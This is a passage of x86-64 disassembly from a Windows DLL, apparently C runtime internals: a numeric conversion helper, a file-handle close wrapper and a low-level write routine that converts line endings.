   18000ee44:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000ee48:	48 8b 04 24          	mov    (%rsp),%rax
   18000ee4c:	33 c9                	xor    %ecx,%ecx
   18000ee4e:	48 c1 e8 20          	shr    $0x20,%rax
   18000ee52:	45 8d 1c 00          	lea    (%r8,%rax,1),%r11d
   18000ee56:	45 3b d8             	cmp    %r8d,%r11d
   18000ee59:	72 05                	jb     0x18000ee60
   18000ee5b:	44 3b d8             	cmp    %eax,%r11d
   18000ee5e:	73 03                	jae    0x18000ee63
   18000ee60:	41 8b cc             	mov    %r12d,%ecx
   18000ee63:	45 89 5a 04          	mov    %r11d,0x4(%r10)
   18000ee67:	85 c9                	test   %ecx,%ecx
   18000ee69:	74 07                	je     0x18000ee72
   18000ee6b:	45 03 cc             	add    %r12d,%r9d
   18000ee6e:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000ee72:	45 03 ce             	add    %r14d,%r9d
   18000ee75:	8d 14 36             	lea    (%rsi,%rsi,1),%edx
   18000ee78:	41 8b cb             	mov    %r11d,%ecx
   18000ee7b:	c1 e9 1f             	shr    $0x1f,%ecx
   18000ee7e:	47 8d 04 1b          	lea    (%r11,%r11,1),%r8d
   18000ee82:	45 03 c9             	add    %r9d,%r9d
   18000ee85:	44 0b c9             	or     %ecx,%r9d
   18000ee88:	8b c6                	mov    %esi,%eax
   18000ee8a:	41 89 12             	mov    %edx,(%r10)
   18000ee8d:	c1 e8 1f             	shr    $0x1f,%eax
   18000ee90:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000ee94:	44 0b c0             	or     %eax,%r8d
   18000ee97:	33 c0                	xor    %eax,%eax
   18000ee99:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000ee9d:	0f be 4d 00          	movsbl 0x0(%rbp),%ecx
   18000eea1:	44 8d 1c 0a          	lea    (%rdx,%rcx,1),%r11d
   18000eea5:	44 3b da             	cmp    %edx,%r11d
   18000eea8:	72 05                	jb     0x18000eeaf
   18000eeaa:	44 3b d9             	cmp    %ecx,%r11d
   18000eead:	73 03                	jae    0x18000eeb2
   18000eeaf:	41 8b c4             	mov    %r12d,%eax
   18000eeb2:	45 89 1a             	mov    %r11d,(%r10)
   18000eeb5:	85 c0                	test   %eax,%eax
   18000eeb7:	74 24                	je     0x18000eedd
   18000eeb9:	41 8b c0             	mov    %r8d,%eax
   18000eebc:	41 ff c0             	inc    %r8d
   18000eebf:	33 c9                	xor    %ecx,%ecx
   18000eec1:	44 3b c0             	cmp    %eax,%r8d
   18000eec4:	72 05                	jb     0x18000eecb
   18000eec6:	45 3b c4             	cmp    %r12d,%r8d
   18000eec9:	73 03                	jae    0x18000eece
   18000eecb:	41 8b cc             	mov    %r12d,%ecx
   18000eece:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000eed2:	85 c9                	test   %ecx,%ecx
   18000eed4:	74 07                	je     0x18000eedd
   18000eed6:	41 ff c1             	inc    %r9d
   18000eed9:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000eedd:	49 03 ec             	add    %r12,%rbp
   18000eee0:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000eee4:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000eee8:	ff cf                	dec    %edi
   18000eeea:	0f 85 cc fe ff ff    	jne    0x18000edbc
   18000eef0:	41 83 7a 08 00       	cmpl   $0x0,0x8(%r10)
   18000eef5:	75 3a                	jne    0x18000ef31
   18000eef7:	45 8b 42 04          	mov    0x4(%r10),%r8d
   18000eefb:	41 8b 12             	mov    (%r10),%edx
   18000eefe:	41 8b c0             	mov    %r8d,%eax
   18000ef01:	45 8b c8             	mov    %r8d,%r9d
   18000ef04:	c1 e0 10             	shl    $0x10,%eax
   18000ef07:	8b ca                	mov    %edx,%ecx
   18000ef09:	c1 e2 10             	shl    $0x10,%edx
   18000ef0c:	c1 e9 10             	shr    $0x10,%ecx
   18000ef0f:	41 c1 e9 10          	shr    $0x10,%r9d
   18000ef13:	41 89 12             	mov    %edx,(%r10)
   18000ef16:	44 8b c1             	mov    %ecx,%r8d
   18000ef19:	44 0b c0             	or     %eax,%r8d
   18000ef1c:	b8 f0 ff 00 00       	mov    $0xfff0,%eax
   18000ef21:	66 03 d8             	add    %ax,%bx
   18000ef24:	45 85 c9             	test   %r9d,%r9d
   18000ef27:	74 d2                	je     0x18000eefb
   18000ef29:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000ef2d:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   18000ef31:	41 8b 52 08          	mov    0x8(%r10),%edx
   18000ef35:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   18000ef3b:	41 85 d3             	test   %edx,%r11d
   18000ef3e:	75 38                	jne    0x18000ef78
   18000ef40:	45 8b 0a             	mov    (%r10),%r9d
   18000ef43:	45 8b 42 04          	mov    0x4(%r10),%r8d
   18000ef47:	41 8b c8             	mov    %r8d,%ecx
   18000ef4a:	41 8b c1             	mov    %r9d,%eax
   18000ef4d:	45 03 c0             	add    %r8d,%r8d
   18000ef50:	c1 e8 1f             	shr    $0x1f,%eax
   18000ef53:	03 d2                	add    %edx,%edx
   18000ef55:	c1 e9 1f             	shr    $0x1f,%ecx
   18000ef58:	44 0b c0             	or     %eax,%r8d
   18000ef5b:	b8 ff ff 00 00       	mov    $0xffff,%eax
   18000ef60:	0b d1                	or     %ecx,%edx
   18000ef62:	66 03 d8             	add    %ax,%bx
   18000ef65:	45 03 c9             	add    %r9d,%r9d
   18000ef68:	41 85 d3             	test   %edx,%r11d
   18000ef6b:	74 da                	je     0x18000ef47
   18000ef6d:	45 89 0a             	mov    %r9d,(%r10)
   18000ef70:	45 89 42 04          	mov    %r8d,0x4(%r10)
   18000ef74:	41 89 52 08          	mov    %edx,0x8(%r10)
   18000ef78:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000ef7d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000ef82:	66 41 89 5a 0a       	mov    %bx,0xa(%r10)
   18000ef87:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ef8c:	48 83 c4 10          	add    $0x10,%rsp
   18000ef90:	41 5e                	pop    %r14
   18000ef92:	41 5c                	pop    %r12
   18000ef94:	5f                   	pop    %rdi
   18000ef95:	c3                   	ret
   18000ef96:	cc                   	int3
   18000ef97:	cc                   	int3
   18000ef98:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000ef9d:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000efa1:	56                   	push   %rsi
   18000efa2:	57                   	push   %rdi
   18000efa3:	41 56                	push   %r14
   18000efa5:	48 83 ec 20          	sub    $0x20,%rsp
   18000efa9:	48 63 f9             	movslq %ecx,%rdi
   18000efac:	83 ff fe             	cmp    $0xfffffffe,%edi
   18000efaf:	75 10                	jne    0x18000efc1
   18000efb1:	e8 7a 86 ff ff       	call   0x180007630
   18000efb6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000efbc:	e9 9d 00 00 00       	jmp    0x18000f05e
   18000efc1:	85 c9                	test   %ecx,%ecx
   18000efc3:	0f 88 85 00 00 00    	js     0x18000f04e
   18000efc9:	3b 3d d9 db 00 00    	cmp    0xdbd9(%rip),%edi        # 0x18001cba8
   18000efcf:	73 7d                	jae    0x18000f04e
   18000efd1:	48 8b c7             	mov    %rdi,%rax
   18000efd4:	48 8b df             	mov    %rdi,%rbx
   18000efd7:	48 c1 fb 05          	sar    $0x5,%rbx
   18000efdb:	4c 8d 35 9e c4 00 00 	lea    0xc49e(%rip),%r14        # 0x18001b480
   18000efe2:	83 e0 1f             	and    $0x1f,%eax
   18000efe5:	48 6b f0 58          	imul   $0x58,%rax,%rsi
   18000efe9:	49 8b 04 de          	mov    (%r14,%rbx,8),%rax
   18000efed:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   18000eff2:	83 e1 01             	and    $0x1,%ecx
   18000eff5:	74 57                	je     0x18000f04e
   18000eff7:	8b cf                	mov    %edi,%ecx
   18000eff9:	e8 2e 0a 00 00       	call   0x18000fa2c
   18000effe:	90                   	nop
   18000efff:	49 8b 04 de          	mov    (%r14,%rbx,8),%rax
   18000f003:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   18000f008:	74 2b                	je     0x18000f035
   18000f00a:	8b cf                	mov    %edi,%ecx
   18000f00c:	e8 5f 0b 00 00       	call   0x18000fb70
   18000f011:	48 8b c8             	mov    %rax,%rcx
   18000f014:	ff 15 06 22 00 00    	call   *0x2206(%rip)        # 0x180011220
   18000f01a:	85 c0                	test   %eax,%eax
   18000f01c:	75 0a                	jne    0x18000f028
   18000f01e:	ff 15 54 20 00 00    	call   *0x2054(%rip)        # 0x180011078
   18000f024:	8b d8                	mov    %eax,%ebx
   18000f026:	eb 02                	jmp    0x18000f02a
   18000f028:	33 db                	xor    %ebx,%ebx
   18000f02a:	85 db                	test   %ebx,%ebx
   18000f02c:	74 15                	je     0x18000f043
   18000f02e:	e8 8d 85 ff ff       	call   0x1800075c0
   18000f033:	89 18                	mov    %ebx,(%rax)
   18000f035:	e8 f6 85 ff ff       	call   0x180007630
   18000f03a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f040:	83 cb ff             	or     $0xffffffff,%ebx
   18000f043:	8b cf                	mov    %edi,%ecx
   18000f045:	e8 9a 0b 00 00       	call   0x18000fbe4
   18000f04a:	8b c3                	mov    %ebx,%eax
   18000f04c:	eb 13                	jmp    0x18000f061
   18000f04e:	e8 dd 85 ff ff       	call   0x180007630
   18000f053:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f059:	e8 06 85 ff ff       	call   0x180007564
   18000f05e:	83 c8 ff             	or     $0xffffffff,%eax
   18000f061:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000f066:	48 83 c4 20          	add    $0x20,%rsp
   18000f06a:	41 5e                	pop    %r14
   18000f06c:	5f                   	pop    %rdi
   18000f06d:	5e                   	pop    %rsi
   18000f06e:	c3                   	ret
   18000f06f:	cc                   	int3
   18000f070:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000f075:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000f079:	56                   	push   %rsi
   18000f07a:	57                   	push   %rdi
   18000f07b:	41 54                	push   %r12
   18000f07d:	41 56                	push   %r14
   18000f07f:	41 57                	push   %r15
   18000f081:	48 83 ec 20          	sub    $0x20,%rsp
   18000f085:	41 8b f0             	mov    %r8d,%esi
   18000f088:	4c 8b f2             	mov    %rdx,%r14
   18000f08b:	48 63 d9             	movslq %ecx,%rbx
   18000f08e:	83 fb fe             	cmp    $0xfffffffe,%ebx
   18000f091:	75 18                	jne    0x18000f0ab
   18000f093:	e8 28 85 ff ff       	call   0x1800075c0
   18000f098:	83 20 00             	andl   $0x0,(%rax)
   18000f09b:	e8 90 85 ff ff       	call   0x180007630
   18000f0a0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f0a6:	e9 91 00 00 00       	jmp    0x18000f13c
   18000f0ab:	85 c9                	test   %ecx,%ecx
   18000f0ad:	78 75                	js     0x18000f124
   18000f0af:	3b 1d f3 da 00 00    	cmp    0xdaf3(%rip),%ebx        # 0x18001cba8
   18000f0b5:	73 6d                	jae    0x18000f124
   18000f0b7:	48 8b c3             	mov    %rbx,%rax
   18000f0ba:	48 8b fb             	mov    %rbx,%rdi
   18000f0bd:	48 c1 ff 05          	sar    $0x5,%rdi
   18000f0c1:	4c 8d 25 b8 c3 00 00 	lea    0xc3b8(%rip),%r12        # 0x18001b480
   18000f0c8:	83 e0 1f             	and    $0x1f,%eax
   18000f0cb:	4c 6b f8 58          	imul   $0x58,%rax,%r15
   18000f0cf:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   18000f0d3:	42 0f be 4c 38 08    	movsbl 0x8(%rax,%r15,1),%ecx
   18000f0d9:	83 e1 01             	and    $0x1,%ecx
   18000f0dc:	74 46                	je     0x18000f124
   18000f0de:	8b cb                	mov    %ebx,%ecx
   18000f0e0:	e8 47 09 00 00       	call   0x18000fa2c
   18000f0e5:	90                   	nop
   18000f0e6:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   18000f0ea:	42 f6 44 38 08 01    	testb  $0x1,0x8(%rax,%r15,1)
   18000f0f0:	74 11                	je     0x18000f103
   18000f0f2:	44 8b c6             	mov    %esi,%r8d
   18000f0f5:	49 8b d6             	mov    %r14,%rdx
   18000f0f8:	8b cb                	mov    %ebx,%ecx
   18000f0fa:	e8 55 00 00 00       	call   0x18000f154
   18000f0ff:	8b f8                	mov    %eax,%edi
   18000f101:	eb 16                	jmp    0x18000f119
   18000f103:	e8 28 85 ff ff       	call   0x180007630
   18000f108:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f10e:	e8 ad 84 ff ff       	call   0x1800075c0
   18000f113:	83 20 00             	andl   $0x0,(%rax)
   18000f116:	83 cf ff             	or     $0xffffffff,%edi
   18000f119:	8b cb                	mov    %ebx,%ecx
   18000f11b:	e8 c4 0a 00 00       	call   0x18000fbe4
   18000f120:	8b c7                	mov    %edi,%eax
   18000f122:	eb 1b                	jmp    0x18000f13f
   18000f124:	e8 97 84 ff ff       	call   0x1800075c0
   18000f129:	83 20 00             	andl   $0x0,(%rax)
   18000f12c:	e8 ff 84 ff ff       	call   0x180007630
   18000f131:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f137:	e8 28 84 ff ff       	call   0x180007564
   18000f13c:	83 c8 ff             	or     $0xffffffff,%eax
   18000f13f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   18000f144:	48 83 c4 20          	add    $0x20,%rsp
   18000f148:	41 5f                	pop    %r15
   18000f14a:	41 5e                	pop    %r14
   18000f14c:	41 5c                	pop    %r12
   18000f14e:	5f                   	pop    %rdi
   18000f14f:	5e                   	pop    %rsi
   18000f150:	c3                   	ret
   18000f151:	cc                   	int3
   18000f152:	cc                   	int3
   18000f153:	cc                   	int3
   18000f154:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000f159:	55                   	push   %rbp
   18000f15a:	56                   	push   %rsi
   18000f15b:	57                   	push   %rdi
   18000f15c:	41 54                	push   %r12
   18000f15e:	41 55                	push   %r13
   18000f160:	41 56                	push   %r14
   18000f162:	41 57                	push   %r15
   18000f164:	48 8d ac 24 c0 e5 ff 	lea    -0x1a40(%rsp),%rbp
   18000f16b:	ff 
   18000f16c:	b8 40 1b 00 00       	mov    $0x1b40,%eax
   18000f171:	e8 1a 65 ff ff       	call   0x180005690
   18000f176:	48 2b e0             	sub    %rax,%rsp
   18000f179:	48 8b 05 80 9e 00 00 	mov    0x9e80(%rip),%rax        # 0x180019000
   18000f180:	48 33 c4             	xor    %rsp,%rax
   18000f183:	48 89 85 30 1a 00 00 	mov    %rax,0x1a30(%rbp)
   18000f18a:	45 33 e4             	xor    %r12d,%r12d
   18000f18d:	45 8b f8             	mov    %r8d,%r15d
   18000f190:	4c 8b f2             	mov    %rdx,%r14
   18000f193:	48 63 f9             	movslq %ecx,%rdi
   18000f196:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   18000f19b:	41 8b dc             	mov    %r12d,%ebx
   18000f19e:	41 8b f4             	mov    %r12d,%esi
   18000f1a1:	45 85 c0             	test   %r8d,%r8d
   18000f1a4:	75 07                	jne    0x18000f1ad
   18000f1a6:	33 c0                	xor    %eax,%eax
   18000f1a8:	e9 6e 07 00 00       	jmp    0x18000f91b
   18000f1ad:	48 85 d2             	test   %rdx,%rdx
   18000f1b0:	75 20                	jne    0x18000f1d2
   18000f1b2:	e8 09 84 ff ff       	call   0x1800075c0
   18000f1b7:	44 89 20             	mov    %r12d,(%rax)
   18000f1ba:	e8 71 84 ff ff       	call   0x180007630
   18000f1bf:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000f1c5:	e8 9a 83 ff ff       	call   0x180007564
   18000f1ca:	83 c8 ff             	or     $0xffffffff,%eax
   18000f1cd:	e9 49 07 00 00       	jmp    0x18000f91b
   18000f1d2:	48 8b c7             	mov    %rdi,%rax
   18000f1d5:	48 8b cf             	mov    %rdi,%rcx
   18000f1d8:	48 8d 15 a1 c2 00 00 	lea    0xc2a1(%rip),%rdx        # 0x18001b480
   18000f1df:	48 c1 f9 05          	sar    $0x5,%rcx
   18000f1e3:	83 e0 1f             	and    $0x1f,%eax
   18000f1e6:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   18000f1eb:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   18000f1ef:	4c 6b e8 58          	imul   $0x58,%rax,%r13
   18000f1f3:	45 8a 64 0d 38       	mov    0x38(%r13,%rcx,1),%r12b
   18000f1f8:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   18000f1fd:	45 02 e4             	add    %r12b,%r12b
   18000f200:	41 d0 fc             	sar    $1,%r12b
   18000f203:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   18000f208:	3c 01                	cmp    $0x1,%al
   18000f20a:	77 14                	ja     0x18000f220
   18000f20c:	41 8b c7             	mov    %r15d,%eax
   18000f20f:	f7 d0                	not    %eax
   18000f211:	a8 01                	test   $0x1,%al
   18000f213:	75 0b                	jne    0x18000f220
   18000f215:	e8 a6 83 ff ff       	call   0x1800075c0
   18000f21a:	33 c9                	xor    %ecx,%ecx
   18000f21c:	89 08                	mov    %ecx,(%rax)
   18000f21e:	eb 9a                	jmp    0x18000f1ba
   18000f220:	41 f6 44 0d 08 20    	testb  $0x20,0x8(%r13,%rcx,1)
   18000f226:	74 0d                	je     0x18000f235
   18000f228:	33 d2                	xor    %edx,%edx
   18000f22a:	8b cf                	mov    %edi,%ecx
   18000f22c:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   18000f230:	e8 db 09 00 00       	call   0x18000fc10
   18000f235:	8b cf                	mov    %edi,%ecx
   18000f237:	e8 74 f8 ff ff       	call   0x18000eab0
   18000f23c:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f241:	85 c0                	test   %eax,%eax
   18000f243:	0f 84 40 03 00 00    	je     0x18000f589
   18000f249:	48 8d 05 30 c2 00 00 	lea    0xc230(%rip),%rax        # 0x18001b480
   18000f250:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   18000f254:	41 f6 44 05 08 80    	testb  $0x80,0x8(%r13,%rax,1)
   18000f25a:	0f 84 29 03 00 00    	je     0x18000f589
   18000f260:	e8 5b 9b ff ff       	call   0x180008dc0
   18000f265:	48 8d 54 24 64       	lea    0x64(%rsp),%rdx
   18000f26a:	48 8b 88 c0 00 00 00 	mov    0xc0(%rax),%rcx
   18000f271:	33 c0                	xor    %eax,%eax
   18000f273:	48 39 81 38 01 00 00 	cmp    %rax,0x138(%rcx)
   18000f27a:	8b f8                	mov    %eax,%edi
   18000f27c:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f281:	48 8d 0d f8 c1 00 00 	lea    0xc1f8(%rip),%rcx        # 0x18001b480
   18000f288:	40 0f 94 c7          	sete   %dil
   18000f28c:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   18000f290:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   18000f295:	ff 15 95 1f 00 00    	call   *0x1f95(%rip)        # 0x180011230
   18000f29b:	33 c9                	xor    %ecx,%ecx
   18000f29d:	85 c0                	test   %eax,%eax
   18000f29f:	0f 84 df 02 00 00    	je     0x18000f584
   18000f2a5:	33 c0                	xor    %eax,%eax
   18000f2a7:	85 ff                	test   %edi,%edi
   18000f2a9:	74 09                	je     0x18000f2b4
   18000f2ab:	45 84 e4             	test   %r12b,%r12b
   18000f2ae:	0f 84 c9 02 00 00    	je     0x18000f57d
   18000f2b4:	ff 15 6e 1f 00 00    	call   *0x1f6e(%rip)        # 0x180011228
   18000f2ba:	49 8b fe             	mov    %r14,%rdi
   18000f2bd:	89 44 24 68          	mov    %eax,0x68(%rsp)
   18000f2c1:	33 c0                	xor    %eax,%eax
   18000f2c3:	0f b7 c8             	movzwl %ax,%ecx
   18000f2c6:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   18000f2cb:	89 44 24 60          	mov    %eax,0x60(%rsp)
   18000f2cf:	45 85 ff             	test   %r15d,%r15d
   18000f2d2:	0f 84 06 06 00 00    	je     0x18000f8de
   18000f2d8:	44 8b e8             	mov    %eax,%r13d
   18000f2db:	45 84 e4             	test   %r12b,%r12b
   18000f2de:	0f 85 a3 01 00 00    	jne    0x18000f487
   18000f2e4:	8a 0f                	mov    (%rdi),%cl
   18000f2e6:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f2eb:	48 8d 15 8e c1 00 00 	lea    0xc18e(%rip),%rdx        # 0x18001b480
   18000f2f2:	80 f9 0a             	cmp    $0xa,%cl
   18000f2f5:	0f 94 c0             	sete   %al
   18000f2f8:	45 33 c0             	xor    %r8d,%r8d
   18000f2fb:	89 44 24 64          	mov    %eax,0x64(%rsp)
   18000f2ff:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f304:	48 8b 14 c2          	mov    (%rdx,%rax,8),%rdx
   18000f308:	45 39 44 15 50       	cmp    %r8d,0x50(%r13,%rdx,1)
   18000f30d:	74 1f                	je     0x18000f32e
   18000f30f:	41 8a 44 15 4c       	mov    0x4c(%r13,%rdx,1),%al
   18000f314:	88 4c 24 6d          	mov    %cl,0x6d(%rsp)
   18000f318:	88 44 24 6c          	mov    %al,0x6c(%rsp)
   18000f31c:	45 89 44 15 50       	mov    %r8d,0x50(%r13,%rdx,1)
   18000f321:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000f327:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   18000f32c:	eb 49                	jmp    0x18000f377
   18000f32e:	0f be c9             	movsbl %cl,%ecx
   18000f331:	e8 96 d0 ff ff       	call   0x18000c3cc
   18000f336:	85 c0                	test   %eax,%eax
   18000f338:	74 34                	je     0x18000f36e
   18000f33a:	49 8b c7             	mov    %r15,%rax
   18000f33d:	48 2b c7             	sub    %rdi,%rax
   18000f340:	49 03 c6             	add    %r14,%rax
   18000f343:	48 83 f8 01          	cmp    $0x1,%rax
   18000f347:	0f 8e b3 01 00 00    	jle    0x18000f500
   18000f34d:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   18000f352:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000f358:	48 8b d7             	mov    %rdi,%rdx
   18000f35b:	e8 98 0a 00 00       	call   0x18000fdf8
   18000f360:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000f363:	0f 84 d9 01 00 00    	je     0x18000f542
   18000f369:	48 ff c7             	inc    %rdi
   18000f36c:	eb 1c                	jmp    0x18000f38a
   18000f36e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000f374:	48 8b d7             	mov    %rdi,%rdx
   18000f377:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   18000f37c:	e8 77 0a 00 00       	call   0x18000fdf8
   18000f381:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000f384:	0f 84 b8 01 00 00    	je     0x18000f542
   18000f38a:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   18000f38e:	33 c0                	xor    %eax,%eax
   18000f390:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   18000f395:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000f39a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000f39f:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   18000f3a4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000f3aa:	33 d2                	xor    %edx,%edx
   18000f3ac:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   18000f3b3:	00 
   18000f3b4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f3b9:	48 ff c7             	inc    %rdi
   18000f3bc:	ff 15 1e 1d 00 00    	call   *0x1d1e(%rip)        # 0x1800110e0
   18000f3c2:	44 8b e8             	mov    %eax,%r13d
   18000f3c5:	85 c0                	test   %eax,%eax
   18000f3c7:	0f 84 70 01 00 00    	je     0x18000f53d
   18000f3cd:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f3d2:	48 8d 0d a7 c0 00 00 	lea    0xc0a7(%rip),%rcx        # 0x18001b480
   18000f3d9:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   18000f3de:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   18000f3e2:	33 c0                	xor    %eax,%eax
   18000f3e4:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   18000f3e9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f3ee:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   18000f3f3:	45 8b c5             	mov    %r13d,%r8d
   18000f3f6:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   18000f3fa:	ff 15 f0 1c 00 00    	call   *0x1cf0(%rip)        # 0x1800110f0
   18000f400:	85 c0                	test   %eax,%eax
   18000f402:	0f 84 2d 01 00 00    	je     0x18000f535
   18000f408:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000f40c:	8b df                	mov    %edi,%ebx
   18000f40e:	41 2b de             	sub    %r14d,%ebx
   18000f411:	03 d8                	add    %eax,%ebx
   18000f413:	44 39 6c 24 60       	cmp    %r13d,0x60(%rsp)
   18000f418:	0f 8c a5 04 00 00    	jl     0x18000f8c3
   18000f41e:	45 33 ed             	xor    %r13d,%r13d
   18000f421:	44 39 6c 24 64       	cmp    %r13d,0x64(%rsp)
   18000f426:	74 58                	je     0x18000f480
   18000f428:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f42d:	45 8d 45 01          	lea    0x1(%r13),%r8d
   18000f431:	c6 44 24 6c 0d       	movb   $0xd,0x6c(%rsp)
   18000f436:	48 8d 0d 43 c0 00 00 	lea    0xc043(%rip),%rcx        # 0x18001b480
   18000f43d:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   18000f442:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f447:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   18000f44b:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   18000f450:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   18000f455:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   18000f45a:	ff 15 90 1c 00 00    	call   *0x1c90(%rip)        # 0x1800110f0
   18000f460:	85 c0                	test   %eax,%eax
   18000f462:	0f 84 c3 00 00 00    	je     0x18000f52b
   18000f468:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
   18000f46d:	0f 8c cf 00 00 00    	jl     0x18000f542
   18000f473:	ff 44 24 40          	incl   0x40(%rsp)
   18000f477:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   18000f47c:	ff c3                	inc    %ebx
   18000f47e:	eb 6f                	jmp    0x18000f4ef
   18000f480:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   18000f485:	eb 63                	jmp    0x18000f4ea
   18000f487:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   18000f48c:	3c 01                	cmp    $0x1,%al
   18000f48e:	77 19                	ja     0x18000f4a9
   18000f490:	0f b7 0f             	movzwl (%rdi),%ecx
   18000f493:	33 c0                	xor    %eax,%eax
   18000f495:	66 83 f9 0a          	cmp    $0xa,%cx
   18000f499:	44 8b e8             	mov    %eax,%r13d
   18000f49c:	66 89 4c 24 44       	mov    %cx,0x44(%rsp)
   18000f4a1:	41 0f 94 c5          	sete   %r13b
   18000f4a5:	48 83 c7 02          	add    $0x2,%rdi
   18000f4a9:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   18000f4ae:	3c 01                	cmp    $0x1,%al
   18000f4b0:	77 38                	ja     0x18000f4ea
   18000f4b2:	e8 49 09 00 00       	call   0x18000fe00
   18000f4b7:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   18000f4bc:	66 3b c1             	cmp    %cx,%ax
   18000f4bf:	75 74                	jne    0x18000f535
   18000f4c1:	83 c3 02             	add    $0x2,%ebx
   18000f4c4:	45 85 ed             	test   %r13d,%r13d
   18000f4c7:	74 21                	je     0x18000f4ea
   18000f4c9:	b8 0d 00 00 00       	mov    $0xd,%eax
   18000f4ce:	8b c8                	mov    %eax,%ecx
   18000f4d0:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   18000f4d5:	e8 26 09 00 00       	call   0x18000fe00
   18000f4da:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   18000f4df:	66 3b c1             	cmp    %cx,%ax
   18000f4e2:	75 51                	jne    0x18000f535
   18000f4e4:	ff c3                	inc    %ebx
   18000f4e6:	ff 44 24 40          	incl   0x40(%rsp)
   18000f4ea:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f4ef:	8b c7                	mov    %edi,%eax
   18000f4f1:	41 2b c6             	sub    %r14d,%eax
   18000f4f4:	41 3b c7             	cmp    %r15d,%eax
   18000f4f7:	73 49                	jae    0x18000f542
   18000f4f9:	33 c0                	xor    %eax,%eax
   18000f4fb:	e9 d8 fd ff ff       	jmp    0x18000f2d8
   18000f500:	8a 07                	mov    (%rdi),%al
   18000f502:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   18000f507:	4c 8d 25 72 bf 00 00 	lea    0xbf72(%rip),%r12        # 0x18001b480
   18000f50e:	4b 8b 0c fc          	mov    (%r12,%r15,8),%rcx
